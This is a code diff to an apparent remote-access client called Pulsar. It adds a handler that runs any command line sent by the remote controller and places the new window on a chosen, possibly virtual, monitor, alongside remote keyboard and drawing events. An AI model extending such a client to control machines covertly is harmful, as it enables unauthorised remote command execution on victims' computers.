@@ -12,7 +12,7 @@ using System.Windows.Forms;
 using System.Threading;
 using System.Diagnostics;
 using Pulsar.Common.Messages.Monitoring.RemoteDesktop;
-using Pulsar.Common.Messages.other;
+using Pulsar.Common.Messages.Other;
 using System.Collections.Concurrent;
 using System.Runtime.InteropServices;
 using Pulsar.Client.Config;
@@ -103,7 +103,8 @@ namespace Pulsar.Client.Messages
                                                              message is DoKeyboardEvent ||
                                                              message is DoDrawingEvent ||
                                                              message is GetMonitors ||
-                                                             message is DoInstallVirtualMonitor;
+                                                             message is DoInstallVirtualMonitor ||
+                                                             message is StartProcessOnMonitor;
 
         public override bool CanExecuteFrom(ISender sender) => true;
 
@@ -129,6 +130,9 @@ namespace Pulsar.Client.Messages
                     Execute(sender, msg);
                     break;
                 case DoInstallVirtualMonitor msg:
+                    Execute(sender, msg);
+                    break;
+                case StartProcessOnMonitor msg:
                     Execute(sender, msg);
                     break;
             }
@@ -575,6 +579,152 @@ namespace Pulsar.Client.Messages
 
             p = Process.Start(psi);
             p.WaitForExit();
+        }
+
+        private void Execute(ISender client, StartProcessOnMonitor message)
+        {
+            try
+            {
+                string fullCommandLine = message.Application;
+                string application;
+                string arguments;
+
+                if (!string.IsNullOrWhiteSpace(fullCommandLine))
+                {
+                    fullCommandLine = fullCommandLine.Trim();
+                    if (fullCommandLine.StartsWith("\""))
+                    {
+                        int endQuote = fullCommandLine.IndexOf('\"', 1);
+                        if (endQuote > 0)
+                        {
+                            application = fullCommandLine.Substring(1, endQuote - 1);
+                            arguments = fullCommandLine.Substring(endQuote + 1).TrimStart();
+                        }
+                        else
+                        {
+                            application = fullCommandLine.Trim('\"');
+                            arguments = string.Empty;
+                        }
+                    }
+                    else
+                    {
+                        int firstSpace = fullCommandLine.IndexOf(' ');
+                        if (firstSpace > 0)
+                        {
+                            application = fullCommandLine.Substring(0, firstSpace);
+                            arguments = fullCommandLine.Substring(firstSpace + 1).TrimStart();
+                        }
+                        else
+                        {
+                            application = fullCommandLine;
+                            arguments = string.Empty;
+                        }
+                    }
+                }
+                else
+                {
+                    application = string.Empty;
+                    arguments = string.Empty;
+                }
+
+                Screen[] allScreens = Screen.AllScreens;
+                if (message.MonitorID < 0 || message.MonitorID >= allScreens.Length)
+                {
+                    Debug.WriteLine($"Invalid monitor ID: {message.MonitorID}. Using primary monitor instead.");
+                    message.MonitorID = 0; // default to primary
+                }
+                Screen targetScreen = allScreens[message.MonitorID];
+
+                var workingArea = targetScreen.WorkingArea;
+                int startX = workingArea.Left;
+                int startY = workingArea.Top;
+
+                Debug.WriteLine($"Starting process '{application}' on monitor {message.MonitorID} at position ({startX}, {startY})");
+
+                var startInfo = new ProcessStartInfo
+                {
+                    FileName = application,
+                    Arguments = arguments,
+                    UseShellExecute = true
+                };
+
+                Process process = Process.Start(startInfo);
+                if (process == null)
+                {
+                    Debug.WriteLine("Failed to start process.");
+                    return;
+                }
+
+                ThreadPool.QueueUserWorkItem(state =>
+                {
+                    try
+                    {
+                        for (int attempt = 0; attempt < 50; attempt++)
+                        {
+                            try
+                            {
+                                if (process.HasExited)
+                                {
+                                    Debug.WriteLine("Process exited before window could be positioned");
+                                    return;
+                                }
+
+                                IntPtr hWnd = process.MainWindowHandle;
+                                if (hWnd != IntPtr.Zero)
+                                {
+                                    Debug.WriteLine($"Found window handle after {attempt * 100}ms, positioning on monitor {message.MonitorID}");
+                                    
+                                    Screen[] screens = Screen.AllScreens;
+                                    if (message.MonitorID >= 0 && message.MonitorID < screens.Length)
+                                    {
+                                        var bounds = screens[message.MonitorID].WorkingArea;
+                                        
+                                        NativeMethods.SetWindowPos(
+                                            hWnd, 
+                                            IntPtr.Zero, 
+                                            bounds.X, 
+                                            bounds.Y, 
+                                            bounds.Width, 
+                                            bounds.Height,
+                                            NativeMethodsHelper.SWP_NOZORDER | NativeMethodsHelper.SWP_SHOWWINDOW);
+                                        
+                                        Debug.WriteLine($"Window positioned at ({bounds.X}, {bounds.Y}) with size ({bounds.Width}x{bounds.Height})");
+                                        
+                                        Thread.Sleep(300);
+                                        
+                                        NativeMethods.SetWindowPos(
+                                            hWnd, 
+                                            IntPtr.Zero, 
+                                            bounds.X, 
+                                            bounds.Y, 
+                                            bounds.Width, 
+                                            bounds.Height,
+                                            NativeMethodsHelper.SWP_NOZORDER | NativeMethodsHelper.SWP_SHOWWINDOW);
+                                    }
+                                    
+                                    break;
+                                }
+                            }
+                            catch (InvalidOperationException ex)
+                            {
+                                Debug.WriteLine($"Error getting window handle: {ex.Message}");
+                            }
+                            
+                            Thread.Sleep(100);
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        Debug.WriteLine($"Error positioning window: {ex.Message}");
+                    }
+                });
+
+                Debug.WriteLine($"Process started, window positioning in progress");
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"Error starting process on monitor: {ex.Message}");
+            }
         }
 
         /// <summary>
